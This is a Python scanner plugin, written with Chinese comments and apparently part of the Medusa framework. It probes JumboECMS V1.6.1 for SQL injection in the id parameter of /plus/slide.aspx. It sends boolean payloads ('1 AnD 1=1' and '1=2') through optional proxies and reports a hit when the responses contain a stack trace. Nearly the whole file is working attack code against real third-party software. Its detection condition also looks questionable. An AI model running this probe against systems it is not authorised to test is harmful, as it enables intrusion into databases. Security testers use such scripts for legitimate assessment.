#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: JumboECMS V1.6.1 注入漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-062717
author: Lucifer
description: 文件/plus/slide.aspx参数id存在SQL注入。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload="/plus/slide.aspx?id=1%20AnD%201=1"
payload2="/plus/slide.aspx?id=1%20AnD%201=2"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp
    global resp2
    payload_url = scheme+"://"+url+payload
    payload_url2 = scheme + "://" + url + payload2
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            resp2 = requests.get(payload_url2, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
            resp2 = requests.get(payload_url2, headers=headers, timeout=5, verify=False)

        con = resp.text
        con2 = resp2.text
        if  con.lower().find('stack trace')!=-1 and con2.lower().find('stack trace')!=-1 :
            Medusa = "{} 存在JumboECMS V1.6.1 注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass